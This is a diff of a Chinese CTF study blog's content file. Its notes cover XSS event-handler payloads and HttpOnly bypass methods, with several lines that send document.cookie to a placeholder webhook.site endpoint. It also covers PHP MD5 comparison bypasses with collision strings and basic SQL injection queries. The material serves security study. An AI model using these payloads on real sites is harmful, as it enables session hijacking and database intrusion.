+&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+
+onkeydown（键盘按键按下时触发XSS）。
+&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;
+
+onkeydown（在键盘按键按下并释放一个键时触发XSS）。
+&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;
+
+
+
+&lt;details&gt;标签对应属性：
+ontoggle（切换时触发XSS，如:详情元素展开或收起）。
+&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;
+
+
+
+&lt;select&gt; 标签对应属性：
+onfocus（获取焦点时触发XSS，如:点击）
+&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;
+
+onclick（点击时触发XSS）。
+&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;
+
+
+
+&lt;form&gt; 标签对应属性：
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;
+
+onmouseout（鼠标移出时触发XSS）
+&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;
+
+onmouseup（鼠标按钮释放时触发XSS）。
+&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;
+
+action（提交表单时触发）
+&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;/form&gt;
+
+
+
+&lt;body&gt; 标签对应属性：
+onload（加载完成时触发XSS）
+&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;
+
+
+
+外带COOKIE获取cookie未设置为HttpOnly方法：document.cookie可获得所有的 Cookie，每条 cookie 以分号和空格 分隔 (即， key=value 键值对)。例如：
+uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1
+
+
+
+设置为HttpOnly
+HttpOnly是包含在Set-Cookie HTTP响应头文件中的附加标志。生成cookie时使用HttpOnly标志有助于降低客户端脚本访问受保护cookie的风险（如果浏览器支持）。
+即如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，此时document.cookie 无效。
+
+方法一：cookie回显页面利用服务器中的cookie回显页面，如：PHPinfo页面
+条件：有相关请求页面可以回显出cookie
+参考链接：How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation
+方法二：TRACE HTTP
+HTTP定义了8种标准的请求方法，包括GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE和CONNECT。其中TRACE用于回显服务器收到的请求。
+
+条件：服务器支持TRACE方式请求
+注：现代浏览器不允许从 JS 发送 TRACE 请求，从而避免了这种技术。但是，在特定软件中发现了一些绕过此方法的方法，例如发送 \r\nTRACE 而不是 TRACE 发送到 IE6.0 SP2。
+方法三： Cookie Jar 溢出参考链接：Cookie Jar Overflow、Cookie Jar Overflow Attack
+方法四：表单劫持XSS能插入在登录表单页面，能直接获取登录的账号密码，使用账号密码登录
+方法五：浏览器漏洞、中间件漏洞例如：Apache服务器漏洞 CVE-2012-0053
+影响版本：2.2.0-2.2.21
+攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。
+带出cookiefetch()方法全局的 fetch() 方法用于发起获取资源的请求。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 Response对象。例如：
+fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)
+
+详细参考：fetch() - Web API 接口参考 | MDN (mozilla.org)
+XMLHttpRequest 对象利用 XMLHttpRequest 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器：
+&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;
+
+详细参考：XMLHttpRequest - Web API 接口参考 | MDN (mozilla.org)
+window.location 对象 window.location 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如：
+&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;
+
+下面是window.location 对象中可用于跳转的方法：
+
+window.location.href：
+
+window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;
+
+
+window.location.assign(url)：
+
+window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);
+
+
+window.location.replace(url)：
+
+window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);
+
+
+
+window.open方法window.open() 是 JavaScript 中用于打开新窗口或新标签页的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。
+例如，以下代码将会在新窗口或新标签页中打开指定 URL：
+window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);
+
+document.write方法利用 document.write 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口
+&lt;script&gt;document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)&lt;/script&gt;
+
+&lt;script&gt;document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)&lt;/script&gt;
+
+附：带src属性的标签
+**&lt;img&gt;**：
+&lt;img src=&quot;image.jpg&quot; alt=&quot;示例图片&quot;&gt;
+
+**&lt;script&gt;**：
+&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
+
+**&lt;iframe&gt;**：
+&lt;iframe src=&quot;page.html&quot;&gt;&lt;/iframe&gt;
+
+&lt;video&gt; 和 **&lt;audio&gt;**：
+&lt;video src=&quot;video.mp4&quot; controls&gt;&lt;/video&gt;
+
+&lt;audio src=&quot;audio.mp3&quot; controls&gt;&lt;/audio&gt;
+
+&lt;embed&gt; 和 **&lt;object&gt;**：
+&lt;embed src=&quot;file.pdf&quot; type=&quot;application/pdf&quot;&gt;
+
+&lt;object data=&quot;file.swf&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/object&gt;
+
+更多正在学习中…..
+jquery-ajax
+iCeServer
+Superagent
+socket
+axios
+
+jQuery AJAX
+
+首先确保你的项目中已经包含了jQuery。如果没有，你可以通过添加以下标签来引入：
+html
+&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+发送请求的示例代码：
+javascript
+$.ajax(&#123;  url: &#x27;YOUR_ENDPOINT_HERE&#x27;,  method: &#x27;GET&#x27;, // 或者 &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, 等。  success: function(data) &#123;    console.log(data);  &#125;,  error: function(error) &#123;    console.error(&#x27;Request Failed:&#x27;, error);  &#125;&#125;);
+
+
+Axios
+
+Axios不是原生支持的，需要引入。你可以通过CDN添加Axios：
+html
+&lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;
+
+使用Axios发送请求：
+javascript
+axios.get(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .then(function (response) &#123;    console.log(response.data);  &#125;)  .catch(function (error) &#123;    console.error(&#x27;Request Failed:&#x27;, error);  &#125;);
+
+
+Superagent
+
+Superagent也需要引入。通过CDN添加Superagent：
+html
+&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js&quot;&gt;&lt;/script&gt;
+
+使用Superagent发送请求：
+javascript
+superagent  .get(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .end((err, res) =&gt; &#123;    if (err) &#123; return console.error(&#x27;Request Failed:&#x27;, err); &#125;    console.log(res.body);  &#125;);
+
+
+WebSocket
+
+WebSocket是HTML5的一部分，不需要额外引入。但WebSocket用于实现双向通信，不同于常规的HTTP请求。以下是一个简单的WebSocket示例：
+javascript
+var socket = new WebSocket(&#x27;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#x27;);socket.onopen = function(event) &#123;  socket.send(&#x27;Hello Server!&#x27;); // 发送数据到服务器&#125;;socket.onmessage = function(event) &#123;  console.log(&#x27;Message from server &#x27;, event.data);&#125;;
+
+
+Fetch API
+
+Fetch API是现代浏览器原生支持的，不需要引入任何额外的库：
+javascript
+fetch(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .then(response =&gt; response.json()) // 假设服务器返回的是JSON数据  .then(data =&gt; console.log(data))  .catch(error =&gt; console.error(&#x27;Request Failed:&#x27;, error));
+
+请替换 &#39;YOUR_ENDPOINT_HERE&#39; 和 &#39;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#39; 为你实际的请求URL或WebSocket端点。每种方法都有其特定的使用场景和优势，选择合适的根据你的项目需求而定。
+参考文章
+参考先知博主「Sh4d0w」的文章
+原文链接：https://xz.aliyun.com/t/12370
+
+参考「hacktricks」学习指南中的文章
+原文链接：https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#httponly
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-Web</tag>
+        <tag>Web-XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>常见协议与PHP伪协议</title>
     <url>/posts/2344074049/</url>
     <content><![CDATA[常见协议与封装协议1 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流(I/O streams)5 zlib:// — 压缩流6 data:// — 数据(RFC 2397)7 glob:// — 查找匹配的文件路径模式8 phar:// — PHP 归档9 ssh2:// — Secure Shell 210 rar:// — RAR11 ogg:// — 音频流12 expect:// — 处理交互式的流
@@ -3682,757 +4345,6 @@ On
         <tag>CTF-Web</tag>
         <tag>Web-PHP</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>CTF-PHP验证</title>
-    <url>/posts/2808981175/</url>
-    <content><![CDATA[PHPPHP中的比较符php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。
-在php中有两种比较符号: 一种是 弱等于，另外一种是 强等于，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:
-
-弱等于
-在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。
-
-==：等于比较符号。用于比较两个值是否相等，不考虑数据类型。
-
-!= 或 &lt;&gt;：不等于比较符号。用于比较两个值是否不相等，不考虑数据类型。
-
-&lt;：小于比较符号。用于比较两个值的大小，如果左侧的值小于右侧的值，则条件为真。
-
-&gt;：大于比较符号。用于比较两个值的大小，如果左侧的值大于右侧的值，则条件为真。
-
-&lt;=：小于等于比较符号。用于比较两个值的大小，如果左侧的值小于或等于右侧的值，则条件为真。
-
-&gt;=：大于等于比较符号。用于比较两个值的大小，如果左侧的值大于或等于右侧的值，则条件为真。
-
-
-
-强等于
-在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。
-
-===：全等比较符号。用于比较两个值是否相等，并且数据类型也相同。
-!==：不全等比较符号。用于比较两个值是否不相等，或者数据类型不相同。
-
-
-
-弱等于转化规则规则1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字（最开头的部分），则其值就是开始的数字，否则（包括后面出现数字的情况），其值为0。例如:
-12==&quot;12&quot;                         // true12==&quot;12aa&quot;                       //true&quot;admin&quot;==0		     	       //truefalse == &quot;&quot; == 0 == NULL		//true
-
-2.布尔值true和任意字符串都弱相等。例如:
-true==&quot;wells&quot;                     //true
-
-3.数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；    0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；
-绕过MD5验证弱类型比较0e绕过原理：若使用PHP的弱比较时，0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0
-例：
-md5(&#x27;QNKCDZO&#x27;) == md5(240610708)
-
-MD5加密后得到
-0e830400451993494058024219903391 == 0e462097431906509019562988736854  //即0==0，为true
-
-
-
-常用MD5加密后为0e的字符串QNKCDZO240610708byGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a
-
-
-
-强类型比较数组绕过原理：MD5无法加密数组，使用数组虽然会报错，返回了null，null&#x3D;&#x3D;null
-使用方法
-a[]=a&amp;b[]=b 
-
-
-
-强类型绕过（MD5碰撞）原理：使用两个数值不同但MD5值相同的字符串（以下字符串经过URL编码）
---------------------c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2--------------------param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2    param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2------------------- Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2    Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2--------------------    --------------------$s1 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab$s2 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab$s3 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab--------------------
-
-拓:sha1加密的两个相同值array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
-
-
-
-MD5-SQL注入题目类似于
-&lt;?phpsql=&quot;select * from admin where password=&#x27;&quot;.md5($pass,true).&quot;&#x27;&quot;;?&gt;
-
-一个ticker：字符串：ffifdyop的md值为
-&#x27;or&#x27;6�]��!r,��b
-
-拼凑到sql语句中变成了
-select * from &quot;admin&quot; where password=&#x27;&#x27;or&#x27;6�]��!r,��b&#x27;
-
-由于非空字符串认为真，所有实现了sql注入
-参考文章
-参考**CSDN博主[yจุ๊บng]**的文章
-原文链接：总结ctf中 MD5 绕过的一些思路_ctf md5-CSDN博客
-
-
-实战1.攻防世界-simple_php&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123;  echo $flag1;&#125;if(is_numeric($b))&#123;  exit();&#125;if($b&gt;1234)&#123;  echo $flag2;&#125;?&gt;
-
-此处使用任意开头不含数字的字符串可使a的相关条件通过。
-
-第一个条件：由于a是弱比较，此时任意开头不含数字的字符串被当成0进行比价
-第二个条件：a不为空（非空字符串），则条件为真。如果a 是一个空字符串，条件将为假。
-
-此处使用开头含数字且数字大于1234的字符串可使b的相关条件通过。
-
-第一个条件：要求b不能是一个数字或者是全由数字构成的字符串
-第二个条件：此时进行若比较，开头含数字且数字大于1234的字符串会被作为数字进行比较
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-Web</tag>
-        <tag>Web-PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入-基础</title>
-    <url>/posts/3000552397/</url>
-    <content><![CDATA[SQL注入流程
-找到注入点：判断是否有漏洞，寻找插入位置
-构造注入语句，并在注入点注入形成新的SQL语句
-新形成的SQL语句提交数据库处理
-数据库执行新的SQL语句，引发注入攻击
-
-前置知识1.特别的数据库
-在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。
-
-schemata表存储该用户创建的所有数据库的库名。
-   &gt;&gt;&gt;&gt;其中记录数据库库名的字段名为：schema_name。
-
-tables表存储该用户创建的所有数据库的库名和表名。
-  &gt;&gt;&gt;&gt;其中记录数据库库名和表名的字段名分别是：tables_schema和table_name。
-
-columns表存储该用户创建的所有数据库的库名、表名和字段名。
-  &gt;&gt;&gt;&gt;其中记录数据库库名、表名和字段名的字段名分别是：tables_schema、table_name和column_name。
-
-
-2.注释符
-  在MySQL中，常见注释符的表达方式：
-​	   # …… ：#号后面的都会被注释
-​	   -- …… ：--号后面的都会被注释，不过在 -- 的前后都需要加空格再加数据(GET传参时只能使用--，后的空格用+代替)
-​	   /* ... */ ：在查询语句中使用斜杠星号注释，从 &#x2F; 开始到 *&#x2F; 结束的部分都被视为注释，不会被执行。
-
-
-但**/* ... */** 的特殊用法--条件注释
-
-条件注释是一种特殊的注释语法，它允许在注释中使用关键字，而这些关键字在执行查询时会被解析为相应的操作。
-语法格式为：
-/*!&lt;conditional_keyword&gt; &lt;query_part&gt; */
-
-   例如：index?id=-10 /*!union*/ /*!select*/ 1,2,3等同于index?id=-10 union select 1,2,3
-SQL注入常用基础语句select version(); #查看数据库版本 select user(); #查看数据库用户select database(); #查看当前库名;select table_name from information_schema.tables where table_schema=database() ; #查看当前库下的表名select group_concat(table_name) from information_schema.tables where table_schema=database() ; #只回显一行数据下查看当前库下的全部表名select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;xxx&#x27;; #查询列名-把xxx缓存前面查询到的表名
-
-
-
-SQL注入常用函数联合查询(union)注入使用1.concat()函数
-​	concat()函数：将多个不同字段的字符串连接成一个字符串。
-concat(str1，str2) #语法
-
-注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
-2.group_concat()函数
-​	group_concat() 将多个同个字段的字符串连接成一个字符串。
-group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法
-
-报错注入使用1.extractvalue()函数
-​	从 MySQL 5.7.8 版本开始，ExtractValue() 函数已被弃用
-​	ExtractValue() 函数来提取 XML 字符串中的特定路径的值。
-ExtractValue(xml_string, xpath_expression)
-
-
-xml_frag：xml文档对象的名称，是一个string类型。
-xpath_expr：使用xpath语法格式的路径。
-
-2.updataxml()函数
-
-xml_target：xml文档对象的名称，是一个string类型。
-xpath_expr：使用xpath语法格式的路径。
-new_xml：需要更新的内容。
-
-3.count()+rand()+floor()+group by()函数
-rand()函数：rand()返回0到1的随机数。rand(0)返回一个固定的0到1的伪随机数。
-floor()函数：floor(x)返回小于或等于 x 的最大整数。
-group by语句：group by语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。
-布尔盲注使用1.substr()/substring()函数
-​	substr()/substring()函数：用来截取数据库某个字段中的一部分。
-substr(string，start开始位置，length截取长度)  #语法
-
-参数
-
-string：必选，数据库中需要截取的字段
-start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。
-length：可选，需要截取的长度。缺省。即截取到结束位置
-
-2.ascii()函数
-​	ascii()函数：返回字符串str的最左边的数值。
-ascii(str)  #语法
-
-2.length() 函数，返回字符串的长度
-length(str) #语法
-
-
-
-
-
-
-
-注入点分类①数字型注入点类似的后端语句
-$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);
-
- 在 Web 端大概是 http://xxx.com/index.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。
-用1 and 1=1进行组合出来的sql注入语句为：
-select * from news where id=1 and 1=1
-
-
-
-②字符型注入点类似的后端语句
-$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);
-
- 在 Web 端大概是 http://xxx.com/index.php?id=admin 这种形式，其注入点id 类型为字符类型，所以叫字符型注入点。
-使用id=1&#39; and 1=1 --+组合出来的sql注入语句为：
-select * from news where id=&#x27;admin&#x27; and 1=1 --+&#x27; LIMIT 0,1&quot;;
-
